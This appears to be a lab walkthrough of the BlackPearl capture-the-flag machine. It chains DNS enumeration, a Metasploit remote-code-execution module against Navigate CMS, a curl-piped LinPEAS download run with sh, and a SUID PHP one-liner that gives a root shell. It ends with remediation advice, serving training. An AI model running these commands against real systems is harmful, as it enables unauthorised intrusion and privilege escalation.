# BlackPearl-CTF-Walkthrough
CyberLab-14


## Overview

BlackPearl is a Linux-based machine that demonstrates how DNS misconfigurations, web vulnerabilities, and local privilege escalation can be chained together to gain root access.
(https://tcm-sec.com/)

- Operating System:	Linux
- Difficulty:	Medium
- Goal:	Obtain Root Access

**Environment:**

- Kali Machine (Attacker).
- Dev (.ovf) VM.
- Make sure both VMs on the same virtual network (NAT).

  ----


## Reconnaissance

**- Host Discovery:**

We can discover **BlackPearl** via Ping Sweep (nmap) or Arp scan (netdiscover) and the discovered target has IP-Address (192.168.38.128).  

```bash
netdiscover -r 192.168.38.0/24  
nmap -sn 192.168.38.0/24
```

<img width="866" height="687" alt="image" src="https://github.com/user-attachments/assets/17da64f0-fc7b-4be6-a092-483cbb3ddfb5" />


---


## Enumeration

**1- Port Scanning:**

```bash
nmap -Pn -sC -sS -sV -p- -T4 192.168.38.128
```

<img width="923" height="413" alt="image" src="https://github.com/user-attachments/assets/287b178b-39fb-4805-b318-d59e548e2be2" />


| Port | Service | Version / Details |
|------|---------|-------------------|
| 22 | SSH | OpenSSH 7.9p1 |
| 80 | HTTP | nginx 1.14.2 |
| 53 | DNS | NA |


**2- Subdirectory Enumeration:**

```bash
http://192.168.38.128:80
```

<img width="1291" height="506" alt="image" src="https://github.com/user-attachments/assets/53d82a46-37e0-4dcd-a5a1-111716cf6401" />
<img width="915" height="505" alt="image" src="https://github.com/user-attachments/assets/18837aa9-cb47-4c24-ba54-efbe22e7eb37" />


- We found an Email which maybe useful in the future. (alek@blackpearl.tcm)
  

```bash
ffuf -u http://192.168.38.128:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1175" height="918" alt="image" src="https://github.com/user-attachments/assets/f08635d2-5599-4866-820e-9a515d1bee2c" />
<img width="1259" height="573" alt="image" src="https://github.com/user-attachments/assets/88ab2d65-9cc7-4b92-bfcc-147a27807536" />

- The subdirectory did not reveal anything useful; it was just a trap, so we will proceed with DNS enumeration.

  **3- DNS Enumeration:**

  ```bash
  dnsrecon -r 127.0.0.0/24 -n 192.168.38.128 -d blank
  ```

<img width="1002" height="329" alt="image" src="https://github.com/user-attachments/assets/5961f5a3-a54b-4d11-922e-2a5667fc239a" />  

- We have now confirmed the domain name, which we discovered twice earlier. To ensure proper DNS resolution, we will map the domain name to the machine’s IP address in `/etc/hosts`.

  ```bash
  sudo mousepad /etc/hosts
  192.168.38.128     blackpearl.tcm
  ping blackpearl.tcm (To Confirm)
  ```

  <img width="794" height="635" alt="image" src="https://github.com/user-attachments/assets/13d1fe97-8e5b-4cee-8c1f-9497c77a43dc" />


 ```bash
  http://blackpearl.tcm
  ```

<img width="1229" height="932" alt="image" src="https://github.com/user-attachments/assets/9c0fd118-79a6-420f-aa96-4101ec82f6ee" />

- Let’s try directory FUZZing again, maybe we’ll find something interesting this time.

```bash
ffuf -u http://blackpearl.tcm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1083" height="890" alt="image" src="https://github.com/user-attachments/assets/3f4af214-3112-4d30-9017-0044a838c6d6" />
<img width="1314" height="986" alt="image" src="https://github.com/user-attachments/assets/281dda9d-f656-4955-b899-ee98538a11d7" />

---

## Gaining Access (Exploitation)

- The *navigate* directory showed a login page for Navigate CMS v2.8. After checking the version, I found a Metasploit module that targets this CMS.
  (https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)

  <img width="1263" height="677" alt="image" src="https://github.com/user-attachments/assets/ec195d48-4290-4d05-b662-7d31f6745d71" />

```bash
sudo msfconsole
use exploit/multi/http/navigate_cms_rce      
set RHOSTS 192.168.38.128    
set VHOST blackpearl.tcm    
run    
```

  <img width="1219" height="826" alt="image" src="https://github.com/user-attachments/assets/391d55bd-5bb3-486d-b48f-a802a5f023bf" />


  ```bash
shell  
whoami
# for interactive shell use below
python3 -c 'import pty;pty.spawn("/bin/bash")' 
```

<img width="311" height="128" alt="image" src="https://github.com/user-attachments/assets/7405b2dc-cf5f-4b84-873e-d2ed3184acc7" />


---

## Maintaining Access (Privilege Escalation)  

-  We will use LinPEAS, a Linux script that helps gather useful information for identifying potential privilege-escalation possibilites.
  
(https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

<img width="1067" height="789" alt="image" src="https://github.com/user-attachments/assets/f9219bd4-bda7-477b-b759-e7d6e98daee1" />  
<img width="806" height="371" alt="image" src="https://github.com/user-attachments/assets/b36fe50d-4730-4c39-9dfe-afae74363de3" />  

- After Scrolling to **Files with interesting permissions** we found SUID (Set User ID) which is a special Linux permission that allows a program to run with the permissions of the file's owner, rather than the user who runs it.  
- In our case, `www-data` can run `/usr/bin/php7.3` with root privileges.  
- We can check **GTFOBins** for a privilege-escalation method. **GTFOBins** is a collection of techniques showing how common Linux programs can be abused for privilege escalation.  

 (https://gtfobins.gm7.org/gtfobins/php/#suid)  

<img width="949" height="301" alt="image" src="https://github.com/user-attachments/assets/abdacf3c-a920-4f13-b3fa-44b065d28b27" />

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh',['-p']);"
```


<img width="753" height="240" alt="image" src="https://github.com/user-attachments/assets/215c018b-bf4e-4eb5-b60a-eb934017cc01" />
<img width="1098" height="282" alt="image" src="https://github.com/user-attachments/assets/6a6cedf0-61ed-4021-a433-11337ea62c05" />

----


## Visual Summary

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/2d829d23-f8ae-4f55-b2d6-5f856dda7e2a" />  



---

## Vulnerability Assessment

| Finding | Severity | Impact | Remediation |
|---|---|---|---|
| DNS Information Disclosure | Low | Reveals internal DNS information and assists reconnaissance. | Restrict DNS zone information and review DNS configuration. |
| Outdated Navigate CMS v2.8 | High | Allows remote code execution and initial system access. | Upgrade Navigate CMS to a supported version or remove the exposed service. |
| SUID PHP Binary | Critical | Allows a low-privileged user to execute commands with root privileges. | Remove the SUID bit from PHP and avoid assigning elevated privileges to interpreters. |





---

## Lessons Learned

- Proper DNS configuration can prevent unnecessary information disclosure.
- Exposed and outdated web applications can provide an initial access.
- SUID permissions should be carefully reviewed and limited.
- Small security weaknesses can become critical when chained together.


---



